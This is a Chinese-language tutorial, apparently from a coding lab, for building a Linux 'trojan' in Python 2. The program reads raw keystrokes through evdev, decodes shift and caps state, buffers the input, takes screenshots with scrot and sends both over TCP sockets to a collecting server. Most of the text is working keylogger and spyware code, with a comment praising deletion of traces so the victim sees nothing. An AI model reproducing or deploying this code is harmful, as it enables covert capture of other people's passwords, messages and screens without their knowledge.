# 1 屏幕截图

屏幕截图功能使用了Python调用外部程序技术，常用的库用subprocess、os.system,commands等，在这里我们使用了commands库，等多的用法可以参考 这篇博客。为了让大家对程序理解更深入，请根据注释中的提示完成相应的扩展功能作为练习。代码详情见screenshot.py,该代码可以直接执行。
```
from task import send_pic_task
def screen_shot(file_name='screen_shot', file_type='png'):
    """
    本程序未实现指定图片存储的路径，用户自行实现该扩展功能
    借助os.path.join函数
    """
    print u'3秒过后截图'
    time.sleep(3)
    # 调用外部程序
    # 因为服务端代代码也是运行在本机，如果名字一样。那么os.remove操作可能会导致
    # 在本地看不到效果
    ret = commands.getstatusoutput("scrot " + file_name + 'tmp.' + file_type)
    if ret[0] != 0:
        print u"图片类型不支持，请换用png jpg等常用格式"
        return
    # 读取图像的二进制文件，进行网络传输
    with open(file_name + 'tmp.' + file_type, "rb") as fp:
        send_pic_task(fp.read(), file_name, file_type)
    # 删除scrot生成的图片，作为黑客可不能留下痕迹啊
    os.remove(file_name + 'tmp.' + file_type)
    print u'发送屏幕截图完成'
```
# 2 键盘输入记录功能

主要按照1的流程来分析代码。

## 2.1 找到所有的键盘设备

/dev/input/目录下存在一些字符设备文件，通过对这些文件的读写和控制，

可以访问实际设备，更多资料可以参考这里。为了找到键盘设备，

需要了解linux的虚拟内存文件系统sysfs, 它挂在于/sys目录，它存储了系统内核和

设备驱动的实时信息，我们要找的键盘设备的信息可以在/sys/class/input目录

下找到，通过查看devices/name可以发现，该文件记录了设备的描述信息。更多关于设备文件和虚拟内存文件系统的知识可以参考这里。

在linux终端下执行下列命令(如linux运行在docker环境中无/dev/input目录，如发现/dev/input目录存在，请跳过此实验步骤或者在本地Linux环境下实验)

linux设备文件的知识

通过代码实现筛选键盘设备(代码详见keylogger/keyboard.py):
```
def device_filter(dev_content):
      """ dev_content显示了设备的名称和信息
          这里通过关键字查找的方式来判断该设备是否是键盘设备
      """
      # 如果设备信息出现中出现了keyboard这个关键词，那么就认为是键盘设备
      if "keyboard" in dev_content.lower():
          return True
      return False


  def find_keyboard_devices(device_filter_func):
      """
          找出所有的键盘设备名
      """
      # 切换到/sys/class/input/这个目录下，类似cd命令
      os.chdir(DEVICES_PATH)
      result = []
      # 遍历/sys/class/input/下的所有的目录
      for each_input_dev in os.listdir(os.getcwd()):
          # 找到设备信息相关的文件
          dev_path = DEVICES_PATH + each_input_dev + '/device/name'
          # 如果这个设备是键盘设备
          if(os.path.isfile(dev_path) and device_filter_func(file(dev_path).read())):
              result.append('/dev/input/' + each_input_dev)
      if not result:
          print("没有键盘设备")
          # 直接结束该进程
          sys.exit(-1)
      return result

  def monitor_keyboard(devs):

    # 将名映射到inputDevice对象
    devices = map(InputDevice, devs)
    # dev.fd一个文件描述符， 然后建立一个字典
    devices = {dev.fd: dev for dev in devices}
    return devices
```
## 2.2 使用evdev获取键盘输入的数据

在这里我们使用evdev库来获取原始的键盘数据，在这里我们使用select库来监听键盘的状态，若有输入时，readers返回键盘的文件描述符，evdev把键盘的输入转化为多个event对象。在这里只需要筛选类型为EV_KEY的键盘输入event对象即可。库的使用说明可以参考官方文档
```
def linux_thread_func(file_name, file_type, content_handler, seconds=10):
      # 获取键盘设备
      devices = monitor_keyboard(find_keyboard_devices(device_filter))
      # 维护shift和caps状态， 对evdev库的event对象进行解析
      dec = decode_character()
      # 连接到指定的服务器
      # 运行 python server.py 可产生一个本地的服务
      server_instance = NetworkClient({"IP": "127.0.0.1", "PORT": 8888})
      # 传输一个文本传输的任务
      text_task = NetworkTaskManager(server_instance, file_type, file_name)
      hook_handler = [None, ]
      # 缓冲区处理, 关联网络文本传输任务
      char_handler = content_handler(text_task.send_content, hook_handler, seconds)

      now_t = time.time()
      while True:
          if int(time.time() - now_t) >= seconds:
              break
          # select 是监听文件描述符的一个库，监听当前所有的键盘设备
          readers, writes, _ = select(devices.keys(), [], [])
          # readers可能有多个键盘设备，所以是一个数组结构
          for r in readers:
              # 键盘有输入操作
              events = devices[r].read()
              for event in events:
                  if event.type == ecodes.EV_KEY:
                      # 转化为自定义的event对象，多了type, status_code属性
                      cus_event = CusKeyEvent(event)
                      # 对event进行解析
                      ret_char = dec(cus_event)
                      if ret_char:
                          # 将当前字符加入到缓存区，并执行相关的缓冲区操作
                          char_handler(ret_char)
```
## 2.3 解析evdev获取的原始数据

为了解析原始数据，使用了以下功能组件：

shift, caps按键的状态管理组件StatusManager
扩展的event对象CurKeyEvent
在按键过程中，shift键和caps键会影响其他键效果(同时按下shift+'z'那么应该是'Z'),因此维护了一个StatusManager对象来管理shift和caps的状态，属性方法get_current_key可以根据当前的状态输出正确的字符结果。部分其他的按键，比如','如果同时按住shfit键那么按键的结果就是<,也是需要注意的地方，可参考get_current_key中的处理。
```
class StatusManager(object):

    def __init__(self, *args, **kwargs):
        """is_shift_press表示有没有同时按住shift,
           同时按住shift和其他按键会导致最后的结果不一样，
           shift + 'c' => 'C'
           shift + '.' = > ">"

           caps 键原因一样, 按一次会变成大写，再按一次会变成小写

           # bug:
               如果在运行本程序之前，caps已经被打开，那么就会导致
               程序记录的字符全是反的，目前没有解决办法
        """
        self.is_shift_press = False
        self.is_caps_lock = False

    def reverse_status(self, obj):
        """ 如果是true， 那么返回False, 如果是False, 那么返回True"""
        if obj:
            return False
        return True

    def recv_caps_message(self):
        """ 当按了一次caps键后， 会产生这个消息
            将caps的状态置为相反状态
        """
        self.is_caps_lock = self.reverse_status(self.is_caps_lock)

    def recv_shift_message(self):
        """ shift键被按时，产生这个消息
            将shift的状态置为相反
        """
        self.is_shift_press = self.reverse_status(self.is_shift_press)

    def get_current_key(self, in_str):
        status = False
        """当caps和shift键没有同时被使用， 那么就需要小写变大写
           例如按了一次caps变大写，再按一次shift就变小写
        """"
        if self.is_shift_press != self.is_caps_lock:
            status = True
        if status:
            return in_str.upper()
        # 对特殊字符的处理
        if self.is_shift_press:
            return special_character_handler(in_str, True)
        return in_str

    def __str__(self):
        # 用来进行调试的信息
        return "capital status " + str(self.is_shift_press != self.is_caps_lock) + "\n"
```


原始的event类的属性比较少，扩展的CuskeyEvent类的status_code属性表示当前按键的状态(down按下，up释放，hold按住不放)，key属性将原始的数据转化为ascii字符。

为了将原始数据对应到ascii码表的字符，我们需要建立一个映射字典:
```
code_dict = {
        1: 'ESC', 2: '1', 3: '2', 4: '3', 5: '4', 6: '5', 7: '6', 8: '7', 9: '8',
        10: '9', 11: '0', 14: 'backspace', 15: 'tab', 16: 'q', 17: 'w', 18: 'e',
        19: 'r', 20: 't', 21: 'y', 22: 'u', 23: 'i', 24: 'o', 25: 'p', 26: '[',
        27: ']', 28: 'enter', 29: 'ctrl', 30: 'a', 31: 's', 32: 'd', 33: 'f', 34: 'g',
        35: 'h', 36: 'j', 37: 'k', 38: 'l', 39: ';', 40: "'", 41: '`', 42: 'shift',
        43: '\\', 44: 'z', 45: 'x', 46: 'c', 47: 'v', 48: 'b', 49: 'n', 50: 'm', 51: ',',
        52: '.', 53: '/', 54: 'shift', 56: 'alt', 57: 'space', 58: 'capslock', 59: 'F1',
        60: 'F2', 61: 'F3', 62: 'F4', 63: 'F5', 64: 'F6', 65: 'F7', 66: 'F8', 67: 'F9',
        68: 'F10', 69: 'numlock', 70: 'scrollock', 87: 'F11', 88: 'F12', 97: 'ctrl', 99: 'sys_Rq',
        100: 'alt', 102: 'home', 104: 'PageUp', 105: 'Left', 106: 'Right', 107: 'End',
        108: 'Down', 109: 'PageDown', 111: 'del', 125: 'Win', 126: 'Win', 127: 'compose'
    }
```

为了简化程序，我们在这里不处理F1~12、Del等按不常用按键的处理，为此我们对按键进行分类，将这类按键划入到unvalidate。而一些特殊按键，比如f5等通过is_show进行过滤，用户可自行修改该方法过滤不需要的按键。

## 2.4 字符缓冲区处理Backspace, Left, Right特殊按键

当使用键盘输入时不可避免的会出错，那么我们会执行回退(Backspace)操作,当按下Backspace按键时上一次输入需要抹除掉，Left和Right操作会调到指定的位置进行输入。所以需要一个字符缓冲区来记录用户的输入以便处理上述情况。本程序中我们使用列表结构来作为缓冲区。这里一个要注意的地方就是hook_func参数，在Python中要改变传入的参数的值，那么需要传入列表或者是字典结构，这里使用列表来传值。该函数的作用是当程序终止记录键盘输入时，确保缓冲区的内容全部被发送出去。使用闭包来避免声明全局缓冲区变量。用户可根据注释里的提示完成扩展功能。
```
def content_handler(net_work_handler, hook_func, str_cached_length=10):
    """
        input_str_content 保存键盘输入的内容,
        str_cached_length 缓冲区的长度为10K
        net_work_handler函数为处理记录文件的函数

       # TODO 当前的程序每次都需要去计算内容的长度，
       当输入的内容比较长时，是会严重影响性能的
       我已经帮你定义了content_length， 请完善char_handler函数
       使用content_length来代替len(input_str_content)
    """
    input_str_content = []
    postion = [None, ]
    content_length = [0, ]

    # hook_func 是为了保证缓冲区数据全部被发送出去
    def __hook_func():
        if input_str_content:
            net_work_handler("".join(input_str_content))
    hook_func[0] = __hook_func

    def char_handler(in_str):
        # backspace键，从缓冲区减去字符
        if in_str == 'backspace':
            if input_str_content:
                input_str_content.pop()
            # TODO content_length - 1
        elif in_str == 'Left':
            # 第一次执行left操作时，从缓存区最右边开始计算
            if postion[0] is None:
                postion[0] = len(input_str_content) - 2
            else:
                postion[0] = postion[0] - 1
            if postion[0] < 0:
                print u"已经到达当前缓冲区开头"
                postion[0] = 0
        elif in_str == 'Right':
            # 第一次执行right操作时，从缓存区最右边开始计算
            if postion[0] is None:
                postion[0] = len(input_str_content) - 1
            else:
                postion[0] = postion[0] + 1

            if postion[0] >= len(input_str_content):
                print u"已经到达当前缓冲区末尾"
                postion[0] = len(input_str_content) - 1
        else:
            if postion[0] is None:
                postion[0] = 0
            input_str_content.insert(postion[0] + 1, in_str)
            postion[0] = postion[0] + 1
        # 缓存区已经满了，此时需要将缓冲区的内容处理
        # net_word_handler是进行内容处理的函数，保存到本地文件，
        # 也可以进行网络传输, 取决于传入的处理函数
        if len(input_str_content) >= str_cached_length:
            ret = net_work_handler("".join(input_str_content))
            if not ret:
                print u"网络错误，无法发送键盘记录文件,缓冲区已满, 程序结束"
                sys.exit(-2)
            input_str_content[:] = []
        # TODO content_length + 1
    return char_handler
```
## 2.5 数据进行网络传输

根据前面的步骤我们已经获取我们所需要的屏幕截图和键盘输入的数据，接下来我们需要将这些数据发送到指定的服务器。在这里需要了解下Python的网络编程的相关知识。首先介绍服务端的编程的基本步骤:

建立一个socket套接字对象
绑定这个套接字到服务器的ip和端口号
设置最大链接数量
接受客户端的链接
与客户端进行通讯
关闭相关资源
用Python实现的代码如下，这是一个最基本服务器的实现，该木马程序中的示例服务器也是基于这个模型进行的。
```
import socket
import json

# 开启ip和端口
ip_port = ('127.0.0.1', 8888)
# 生成一个句柄
sk = socket.socket()
# 绑定ip端口
sk.bind(ip_port)
# 最多连接数
sk.listen(5)
# 自定义的数据处理函数
def data_handle(data):
    pass
# 开启死循环，接受客户端的请求
while True:
    conn, addr = sk.accept()
    header_message = conn.recv(1024)
    # 获取客户端请求数据
    client_data = conn.recv(1024*10)
    # 数据进行业务处理
    data_handle(client_data)
    conn.close()
sk.close()
```
接下来的我们讨论客户端的实现，客户端的编程的基本模型比服务端要简单一些。只有两个步骤：

与服务器进行连接
和服务器进行数据通讯
现在思考一下在这个木马程序中我们需要给服务器发送那些数据，很容易分析出我们需要传输<文件名，文件类型，文件的具体内容，结束标志>，为什么需要结束标志咧？因为客户端已经发送完数据了，需要通知服务器数据已经完成，可以断开连接了，这个时候客户端和服务器就能正常断开连接，将资源还给操作系统了。

现在我们开始思考如何实现客户端的功能，让我们再次梳理一下客户端的功能:

建立与服务器的连接
发送文件名和文件类型（简称消息头部）
发送文件的具体内容
发送结束标志
在本程序中我们除了发送键盘输入数据外还有屏幕截图，因为这两个功能是并行执行的，所以这两类数据的发送不能共用同一个服务器连接(否则键盘数据和图像数据混合在一起就没法区分了)。本程序维护了一个服务器连接的类,
```
class NetworkClient(object):
    def __init__(self, config):
        self.server_ip = config['IP']
        self.server_port = config['PORT']
        # 新建一个scoket对象
        self.sock = socket.socket()
        # 建立与服务器的连接
        self.sock.connect((self.server_ip, self.server_port))

    def send_data(self, data):
        # 发送数据到服务器
        ret = self.sock.sendall(data)
        assert ret != -1

    def destroy(self):
        # 断开与服务器的连接
        try:
            self.sock.close()
        except Exception as e:
            print e
```
将每一次的数据发送抽象成一次网络任务，发送消息头部就相当于执行了一次网络任务。
```
class NetworkTaskManager(object):

    def __init__(self, server_instance, file_type, file_name):
        self.server_instance = server_instance
        self.file_type = file_type
        self.file_name = file_name
        # 发送消息头， 在这里是为了发送文件名和文件类型
        self.send_message_header()

    def send_message_header(self):
        # 发送消息头部
        header_message = {
            "file_name": self.file_name,
            "file_type": self.file_type
        }
        # 建立一个任务，然后发送相应的内容
        task = BasicNetworkTask(self.server_instance, json.dumps(header_message))
        task.run()

    def send_content(self, content):
        # 发送文件的正文
        task = BasicNetworkTask(self.server_instance, content)
        task.run()
        return "success"

    def send_stop_message(self):
        # 发送结束标志
        # 建立一个任务，然后发送相应的内容,告诉数据已经发送完毕
        content = "\r\nover\r\n"
        task = BasicNetworkTask(self.server_instance, content)
        task.run()
        # 记得释放这个tcp的链接
        self.server_instance.destroy()
```
## 2.6 运行程序

上述我们实现了键盘记录、截图功能、数据发送功能。根据4.2，在这里讲述下Python的多进程编程，将上述功能组合在一起实现并发运行。 Python下

的多进程编程常用的库是muptiprocessing,multiprocessing库提供了非常强大的功能，支持子进程、通讯和共享数据。 但因本程序限制在linux环境下，

所以使用更为轻量的os.fork来创建多进程程序。
```
def main(key_name, pic_name, key_type='txt', pic_type='png'):
    """
       因为捕捉键盘记录 和屏幕截图 是两个独立的任务，
       所以在这里fork产生一个新的进程来执行屏幕截图
    """
    f = os.fork()
    if f == 0:
        # 这里是子进程, 会调用外部程序
        screen_shot(pic_name, pic_type)
    else:
        # 父进程
        keylogger_func(key_name, key_type)
```
接下来我们运行一下程序看一下实验效果。

* 开启键盘数据的服务
    * python server.py -p 8888
* 开启接收图片数据的服务
    * python server -p 8889
* 运行我们的主程序
    * python main.py
在程序运行期间，你可以在键盘上任意输入就可以进行记录了。运行效果如下,其中shot.png是服务器保存下来的屏幕截图，key.txt是键盘记录的数据。
